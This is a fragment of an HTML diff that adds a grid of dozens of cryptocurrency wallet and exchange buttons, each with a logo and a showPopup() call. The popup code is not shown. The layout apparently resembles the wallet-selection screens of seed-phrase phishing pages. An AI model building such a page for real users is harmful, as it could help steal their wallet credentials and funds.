+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Infiniti</div>
+                      </div>
+                    </button>
+
+                    <!-- Coinspace Button -->
+                    <button onclick="showPopup('Coinspace')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coinspace.png" alt="Coinspace"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinspace</div>
+                      </div>
+                    </button>
+
+                    <!-- Stakedwallet.io Button -->
+                    <button onclick="showPopup('Stakedwallet.io')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/stakedwallet.png" alt="Stakedwallet.io"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Stakedwallet.io</div>
+                      </div>
+                    </button>
+
+                    <!-- Coinjar Button -->
+                    <button onclick="showPopup('Coinjar')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coinjar.png" alt="Coinjar"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinjar</div>
+                      </div>
+                    </button>
+
+                    <!-- Arculus Button -->
+                    <button onclick="showPopup('Arculus')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/arculus.png" alt="Arculus"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Arculus</div>
+                      </div>
+                    </button>
+
+                    <!-- Cool Wallet Button -->
+                    <button onclick="showPopup('Cool Wallet')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coolwallet.png" alt="Cool Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Cool Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Coldcard Wallet Button -->
+                    <button onclick="showPopup('Coldcard Wallet')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coolcard.png" alt="Coldcard Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coldcard Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- BRD Wallet Button -->
+                    <button onclick="showPopup('BRD Wallet')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/brdwallet.png" alt="BRD Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BRD Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Tezos Button -->
+                    <button onclick="showPopup('Tezos')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/tezoswallet.png" alt="Tezos"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Tezos</div>
+                      </div>
+                    </button>
+
+                    <!-- Metamask Button -->
+                    <button onclick="showPopup('Metamask')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons"
+                            src="logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg.jpeg"
+                            alt="Metamask" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Metamask</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Electrum')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/electrum.png" alt="electrum
+                                                style=" width: 85px; height: 85px; object-fit: contain; display:
+                            block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Electrum</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Safemoon')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/safemoon.png" alt="safemoon"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Safemoon</div>
+                      </div>
+                    </button>
+
+
+                    <!-- Adding GeroWallet -->
+                    <button onclick="showPopup('Kraken')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/kraken.png" alt="kraken
+                                                style=" width: 85px; height: 85px; object-fit: contain; display:
+                            block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Kraken</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Crypto.com')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/crypto.com.png" alt="crypto.com"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Crypto.com</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Eterni Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ethermiwallet.png" alt="ethermiwallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Eterni Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Adding GeroWallet -->
+                    <button onclick="showPopup('Flint Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/flintwallet.png" alt="flintwallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Flint Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Trezor Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/trezor-wallet-logo-png_seeklogo-536975.png" alt="Trezor
+                                                style=" width: 85px; height: 85px; object-fit: contain; display:
+                            block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Trezor Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Digitex')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/digitex.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Digitex</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Klever')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/klever.jpg.jpeg" alt="klever"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Klever Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Schorlaship wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/sc.jpg.jpeg" alt="scholar"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Schorlaship Wallet
+                        </div>
+                    </button>
+
+                    <button onclick="showPopup('Cake Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/cakewallet.jpg.jpeg" alt="Cake Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Cake Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Blue Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bluewallet.jpg.jpeg" alt="Blue Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Blue Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Solflare Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/solflare.png" alt="Solflare Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Solflare Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Phoenix Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/Phoenix.png" alt="Phoenix Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Phoenix Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Hellium Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/hellium.png" alt="Hellium Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Hellium Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Kaspium Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/Kaspium.jpg.jpeg" alt="Kaspium Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Kaspium Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Exodus Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/exodus-wallet.png" alt="Exodus Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Exodus Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Kelpr Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/keplr.png" alt="Kelpr Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Kelpr Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('PayBolt Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/payb.jpg.jpeg" alt="PayBolt Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">PayBolt Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Coinomi Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coinnomi.png" alt="Coinomi Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinomi Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Zerion Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/zerion.png" alt="Zerion Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Zerion Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Leap Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/leap.png" alt="Leap Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Leap Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Trezor Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/trez.jpg.jpeg" alt="Trezor Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Trezor Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Guarda Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/gua.jpg.jpeg" alt="Guarda Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Guarda Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('iToken Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/it.jpg.jpeg" alt="iToken Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">iToken Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Ballet Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ball.jpg.jpeg" alt="Ballet Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ballet Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Bluemoon.io Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
